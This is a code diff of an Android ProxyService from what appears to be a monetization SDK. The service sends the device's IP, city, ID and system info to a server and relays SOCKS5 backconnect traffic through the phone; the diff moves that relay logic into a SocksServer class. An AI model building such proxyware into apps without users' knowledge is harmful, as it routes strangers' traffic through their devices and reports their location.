@@ -3,15 +3,14 @@ package net.monetizemyapp.android
 import android.app.Service
 import android.content.Intent
 import android.os.IBinder
+import android.os.NetworkOnMainThreadException
 import com.proxyrack.BuildConfig
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import net.monetizemyapp.MonetizeMyApp
 import net.monetizemyapp.Properties
 import net.monetizemyapp.di.InjectorUtils
-import net.monetizemyapp.network.SocketTcpClient
 import net.monetizemyapp.network.TcpClient
 import net.monetizemyapp.network.deviceId
 import net.monetizemyapp.network.getSystemInfo
@@ -22,17 +21,14 @@ import net.monetizemyapp.network.model.step0.Pong
 import net.monetizemyapp.network.model.step1.Hello
 import net.monetizemyapp.network.model.step1.HelloBody
 import net.monetizemyapp.network.model.step2.Backconnect
-import net.monetizemyapp.network.model.step2.Connect
-import net.monetizemyapp.network.model.step2.ConnectBody
-import net.monetizemyapp.network.socks.Socks5Message
 import net.monetizemyapp.network.socks.SocksServer
 import net.monetizemyapp.toolbox.CoroutineContextPool
 import net.monetizemyapp.toolbox.extentions.*
 import retrofit2.HttpException
 import retrofit2.Response
 import java.io.IOException
-import java.net.SocketException
 import kotlin.coroutines.CoroutineContext
+
 
 @ExperimentalUnsignedTypes
 @ExperimentalStdlibApi
@@ -45,12 +41,10 @@ class ProxyService : Service(), CoroutineScope {
         private val TAG: String = ProxyService::class.java.canonicalName ?: ProxyService::class.java.name
     }
 
-    private val serverConnections = mutableListOf<TcpClient>()
-
-
     private val locationApi by lazy { InjectorUtils.Api.provideLocationApi() }
+    private val socketServer by lazy { SocksServer() }
 
-    private val mainTcpClient: TcpClient by lazy {
+    private val mainTcpClientDelegate = lazy {
         InjectorUtils.TcpClient.provideServerTcpClient()
             .apply {
                 listener = object : TcpClient.OnSocketResponseSimpleListener() {
@@ -68,7 +62,7 @@ class ProxyService : Service(), CoroutineScope {
                             }
                             is Backconnect -> {
                                 logd(TAG, "mainTcpClient response message is Backconnect")
-                                startNewBackconnectSession(response)
+                                socketServer.startNewBackconnectSession(response)
                             }
                         }
                     }
@@ -81,20 +75,20 @@ class ProxyService : Service(), CoroutineScope {
             }
     }
 
+    private val mainTcpClient by mainTcpClientDelegate
+
     override fun onBind(intent: Intent): IBinder? {
         return null
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        launch {
-            if (!serverConnections.contains(mainTcpClient)) {
-                startProxy()
-            }
-        }
+        startProxy()
+
+
         return START_STICKY
     }
 
-    private suspend fun startProxy() {
+    private fun startProxy() {
 
         logd(TAG, "StartProxy")
 
@@ -104,130 +98,37 @@ class ProxyService : Service(), CoroutineScope {
             throw IllegalArgumentException("Error: \"monetize_app_key\" is null. Provide \"monetize_app_key\" in Manifest to enable SDK")
         }
 
+        launch {
+            val location: Response<IpApiResponse>? = try {
+                locationApi.getLocation()
+            } catch (ex: HttpException) {
+                loge(TAG, "Location request error : ${ex.message}")
+                null
+            } catch (ex: IOException) {
+                loge(TAG, "Location request error : ${ex.message}")
+                null
+            }
 
-        val location: Response<IpApiResponse>? = try {
-            locationApi.getLocation()
-        } catch (ex: HttpException) {
-            loge(TAG, "Location request error : ${ex.message}")
-            null
-        } catch (ex: IOException) {
-            loge(TAG, "Location request error : ${ex.message}")
-            null
-        }
-
-        location?.takeIf { it.isSuccessful }?.body()?.let {
-            val message = Hello(
-                HelloBody(
-                    clientKey,
-                    it.query,
-                    deviceId,
-                    it.city,
-                    Properties.TEST_COUNTRY_CODE.takeIf { BuildConfig.DEBUG } ?: it.countryCode,
-                    getSystemInfo()
+            location?.takeIf { it.isSuccessful }?.body()?.let {
+                val message = Hello(
+                    HelloBody(
+                        clientKey,
+                        it.query,
+                        deviceId,
+                        it.city,
+                        Properties.TEST_COUNTRY_CODE.takeIf { BuildConfig.DEBUG } ?: it.countryCode,
+                        getSystemInfo()
+                    )
                 )
-            )
-            serverConnections.add(mainTcpClient)
-            mainTcpClient.sendMessage(message.toJson())
+
+                mainTcpClient.sendMessage(message.toJson())
+            }
         }
     }
 
-
-    private fun startNewBackconnectSession(backconnect: Backconnect) {
-        launch {
-            val newServerConnectionTcpClient = InjectorUtils.TcpClient.provideServerTcpClient()
-            serverConnections.add(newServerConnectionTcpClient)
-
-            val message = Connect(ConnectBody(backconnect.body.token))
-            newServerConnectionTcpClient.sendMessageSync(message.toJson())
-
-            logd(TAG, "startNewBackconnectSession: sendMessageSync, message = ${message.toJson()}")
-            val authMethodsSupported = newServerConnectionTcpClient.waitForBytesSync()
-            logd(
-                TAG,
-                "startNewBackconnectSession: waitForBytesSync, firstBytesResponse = ${authMethodsSupported.contentToString()}"
-            )
-
-            val chosenAuthMethod = byteArrayOf(5, 0)
-            newServerConnectionTcpClient.sendBytesSync(chosenAuthMethod)
-            logd(TAG, "startNewBackconnectSession: send chosenAuthMethod = ${chosenAuthMethod.contentToString()}")
-
-            val connectionRequestBytes = newServerConnectionTcpClient.waitForBytesSync()
-            logd(
-                TAG,
-                "startNewBackconnectSession: connectionRequestBytes = ${connectionRequestBytes.contentToString()}"
-            )
-
-
-            val (ip, port) = SocksServer.parseSocksConnectionRequest(connectionRequestBytes)
-
-            logd(TAG, "startNewBackconnectSession: try to connect to backconnect ip = $ip, port = $port\n")
-
-            val backConnectSocket = InjectorUtils.Sockets.provideSimpleSocketConnection(ip, port)
-            val newBackConnectTcpClient = SocketTcpClient(backConnectSocket)
-            serverConnections.add(newBackConnectTcpClient)
-
-            // Return bytes, or error, to the client
-            val status = if (backConnectSocket.isBound && !backConnectSocket.isClosed) 0 else 5
-            val socksServerResponse =
-                Socks5Message(5.toByte(), status.toByte(), 0, 0, 0, byteArrayOf(0), byteArrayOf(0))
-            logd(
-                TAG,
-                "startNewBackconnectSession: sendBytesSync, statusResponseToServer = ${socksServerResponse.bytes.contentToString()}"
-            )
-
-            newServerConnectionTcpClient.sendBytesSync(socksServerResponse.bytes)
-            exchangeBytes(newServerConnectionTcpClient, newBackConnectTcpClient)
-        }
-    }
-
-    private fun exchangeBytes(serverConnectionClient: TcpClient, backConnectClient: TcpClient) {
-        var canceled = false
-        launch {
-            try {
-                while (isActive && !canceled) {
-                    val backConnectResponse = backConnectClient.waitForBytesSync()
-                    logd(TAG, "Received message from backconnect: message = $backConnectResponse")
-                    logd(
-                        TAG,
-                        "Received message from backconnect: message (decoded) = ${backConnectResponse.decodeToString()}"
-                    )
-                    if (backConnectResponse.isNotEmpty()) {
-                        serverConnectionClient.sendBytesSync(backConnectResponse)
-                    } else {
-                        canceled = true
-                    }
-                }
-            } catch (e: SocketException) {
-                e.printStackTrace()
-                loge(TAG, "exchangeBytes Error: ${e.message}")
-            }
-        }
-        launch {
-            try {
-                while (isActive && !canceled) {
-                    val serverConnectionResponse = serverConnectionClient.waitForBytesSync()
-                    logd(TAG, "Received message from server: message = $serverConnectionResponse")
-                    logd(
-                        TAG,
-                        "Received message from server: message (decoded) = ${serverConnectionResponse.decodeToString()}"
-                    )
-                    if (serverConnectionResponse.isNotEmpty()) {
-                        backConnectClient.sendBytesSync(serverConnectionResponse)
-                    } else {
-                        canceled = true
-                    }
-                }
-            } catch (e: SocketException) {
-                e.printStackTrace()
-                loge(TAG, "exchangeBytes Error: ${e.message}")
-            }
-        }
-
-        if (canceled) {
-            listOf(serverConnectionClient, backConnectClient).forEach {
-                serverConnections.remove(it.apply { stop() })
-            }
-        }
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        stopAllConnections()
+        super.onTaskRemoved(rootIntent)
     }
 
     private fun onConnectionLost() {
@@ -236,15 +137,25 @@ class ProxyService : Service(), CoroutineScope {
     }
 
     override fun onDestroy() {
-        stopAllConnections()
+        try {
+            stopAllConnections()
+        } catch (e: NetworkOnMainThreadException) {
+            logd(
+                TAG,
+                "Exception while trying to stop all connection. Probably it tries to stop connection on not initialized TcpClient \n${e.message}"
+            )
+        }
+        super.onDestroy()
     }
 
+
     private fun stopAllConnections() {
-        launch {
-            serverConnections.forEach {
-                it.stop()
-            }
+        if (mainTcpClientDelegate.isInitialized()) {
+            logd(TAG, "stopping main connection")
+            mainTcpClient.stop()
         }
+        logd(TAG, "stopping server")
+        socketServer.stopServer()
         lifecycleJob.cancel()
     }
 }
